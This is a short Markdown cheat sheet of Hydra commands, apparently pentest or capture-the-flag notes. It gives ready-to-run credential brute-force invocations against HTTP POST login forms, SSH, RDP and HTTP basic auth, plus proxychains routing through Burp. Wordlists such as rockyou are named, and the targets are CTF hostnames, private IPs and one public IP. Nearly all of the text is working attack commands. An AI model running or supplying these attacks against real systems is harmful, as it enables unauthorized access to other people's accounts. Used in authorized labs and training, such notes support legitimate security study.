##### TLS
Specify port if you use https: `-s 443`
and specify scheme: `https-post-form`

##### Hydra with Burpsuite
```
tail /etc/proxychain.conf
http 127.0.0.1:8080
```

```bash
proxychains -q hydra ...
```

#### POST form:
```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
```

```bash
hydra -l milesdyson -P log1.txt $ip http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20
```
or success condition: :S=302 or :S=Dashboard
failure condition :F=Invalid

```shell
 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.53.230 -s 30768 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```


Multiple targets:
```shell
hydra -l root -p toor -M targets.txt ssh
```

#### Bruteforce ssh
```bash
 hydra -L users.txt -P passwords.txt 10.129.131.97 ssh
 ```

#### Generate passwords of charset and from 6 to 8 chars:
```shell
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

#### Bruteforce basic auth
```shell
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```